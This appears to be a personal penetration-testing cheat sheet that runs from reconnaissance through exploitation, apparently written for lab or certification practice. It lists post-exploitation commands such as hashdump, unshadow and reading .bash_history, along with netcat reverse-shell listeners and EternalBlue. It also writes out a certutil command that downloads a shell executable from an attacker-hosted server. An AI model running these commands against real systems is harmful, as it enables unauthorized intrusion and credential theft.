5 STAGES OF HACKING

### 1 Reconnaissance (Info gathering)
Recon has two parts 
1. Passive
2. Active (Scanning and Enumeration)

In this stage we also have to do the following
	1. Target Validation
		WHOIS, nslookup, dnsrecon
	2. Finding subdomains
		Google fu, dig, nmap, sublist3r, bluto, crt.sh
	3. Fingureprinting
		nmap, wappalyzer, whatweb, builtwhith, netcat
	4. Data breaches
		Havelbeenpwned, breach-parse, weleakinfo
		
		Note: If you find a database machine with authentication, try the default creds from the internet.







### 2 Scanning and Enumeration
1. Nmap
2. Source code analysis
3. Nikto
4. SMB
5. searchsploit

NOTE: If you hit a deadend, search the version exploit on google.
### FTP: We have two options to exploit.
1. Exploit the ftp software version related vulnerabilities.
2. Exploit the ftp by uploading a shell then using a webserver directory to execute the shell.  	 

### 3 Gaining Access (Exploitation)
NOTE: Always use auxerally scanners to confirm the vulnerability exists before sending an exploit.
getuid
sysinfo
history
cat .bash_history
sudo -l (Search for (root) NOPASSWD )
Architecture
getsystem
hashdump
shell
locate
unshadow
Staged Payload (generic/shell/reverse_tcp)
Unstaged Payload (generic/shell_reverse_tcp)
Ethernal Blue (Windows 7 + SMB) // Manual way to exploit Eternal blue >> Autoblue.py
netstat (Show open ports)
search suggester
binary put file_name (Use this command to send file via ftp)
nc -nvlp 4447 (Netcat lsitner)
searchsploit
sourcecode analysis of the webpage
migrate _processnumber_ (Windows)
nikto -h URL


### 4 Maintaining Access

### 5 Covering tracks


### Screenshot taking tool for windows
Greenshot

### Note taking tool 
Keep note

For each host make sure you are creating a Keep note file.
Within the file
Create two sections
1. Scanning
	port number -- ip
	related vulnerabilites

	Nikto Scan results

2. Vulnerabilities
Port number - Potentially vulnerable to XXXX (url)

### Low hanging fruties
80
443 / SSL
139/smb
445/SMB
Webalizer
SSH

### Rapid7 and Exploit DB


### Dirbuster File Extensions

Windows Server
asm,asmx,asp,aspx,bak

Apache
php,zip,rar,bak

### MSFVENOM

sEARCH msfvenom cheat sheet on google

 use exploit/multi/handler (Exploit handler is a listner) 
 Now you have to set a payload for the exploit handler

NOTE: Use the same tcp_reverse shell as used in the msfvenom
set payload ......tcp_reverse


### HTTP Server (Linux)
python -m SimpleHTTPServer 80
You hosted a file on linux using the above command then you can get the file in windows by the below command.
  
### Transporting file to Windows
certutil -urlcache -f http://10.10.14.24/sh.exe c:\user\desktop

### Transporting files to Linux
wget http://IP_ADDRESS/file_name

### Netcat listner
nc -nvlp 1234

### Linx privilage escalation scripts
LinEnum.sh
Linuxprivchecker.py

### Exploit 
Local (Use local when you have already gained access to the system.)
exploits/linux/local/xyz.php
or 
Remote (Use remote to gain access to the system)
exploits/linux/remote/xuz.php

### tty issue
search on google tty escape

### Webapp Sec
Learn all the allowed methods 

Learn all the error codes.
